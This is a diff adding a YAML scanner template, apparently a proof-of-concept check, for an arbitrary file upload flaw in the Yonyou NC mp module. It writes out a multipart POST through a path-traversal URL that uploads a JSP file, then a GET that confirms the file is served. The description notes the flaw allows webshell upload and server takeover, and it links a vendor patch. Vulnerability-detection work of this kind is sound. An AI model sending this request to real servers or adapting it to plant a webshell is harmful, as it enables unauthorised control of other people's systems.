@@ -1,0 +1,59 @@
+app: 用友软件
+query: app:"用友软件"
+meta:
+  name: 用友NC mp模块文件上传漏洞分析
+  level: 4
+  tags:
+  - file_upload
+  description: 通过mp模块进行任意文件上传，从而上传webshell实现控制服务器。
+  homepage: ""
+  author: X prism
+  references: ""
+  solution: 安装补丁：https://security.yonyou.com/#/noticeInfo?id=342
+  create_at: "2024-07-13 00:52:02"
+  available: false
+  steps:
+    variable: []
+    verify_steps:
+      type: and
+      verify:
+      - request:
+          method: POST
+          path: /mp/login/../uploadControl/uploadFile
+          redirect: true
+          header:
+          - Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryoDIsCqVMmF83ptmp
+          params: |-
+            ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+            Content-Disposition: form-data; name="file"; filename="test.jsp"
+            Content-Type: application/octet-stream
+
+            test content
+            ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+            Content-Disposition: form-data; name="submit"
+
+            上传
+            ------WebKitFormBoundaryoDIsCqVMmF83ptmp
+        response:
+        - name: code
+          value: "200"
+          type: equals
+      - request:
+          method: GET
+          path: /mp/uploadFileDir/test.jsp
+          redirect: true
+          header: []
+          params: ""
+        response:
+        - name: code
+          value: "200"
+          type: equals
+        - name: body
+          value: test content
+          type: contains
+    exploit_steps:
+      type: ""
+      params:
+        name: ""
+        type: input
+        value: ""
